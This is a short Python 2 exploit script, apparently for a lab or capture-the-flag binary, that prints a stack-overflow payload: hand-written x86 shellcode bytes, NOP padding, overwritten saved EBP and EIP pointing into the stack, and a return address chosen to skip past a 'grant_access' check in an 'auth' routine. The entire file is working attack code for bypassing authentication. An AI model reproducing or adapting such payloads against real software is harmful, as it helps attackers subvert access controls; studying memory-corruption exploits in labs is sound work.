import struct

ebp = struct.pack("I",0x8049329)#ffefffdc)
eip = struct.pack("I",0xffefffc4) #point start of the attack
uid = "\xE8\x03\x00\x00"
push_eip="\xFF\x35\x20\x00\x00\x00" #no addition "\xFF\x35\x00\x00\x00\x00"
mov_ebp="\xBD\x29\x93\x04\x08" #"\xCC"*5#"\xBD\xD0\xFF\xEF\xFF"
push_80492a2 = "\x68\xA2\x92\x04\x08" #go to func
ret = '\xC3' + '\x90'
exx = struct.pack("I",0x804936b)#70) #go after grant_access in auth
payload = mov_ebp + push_80492a2 + ret
print payload + '\x90'*8 + ebp + eip + exx + uid
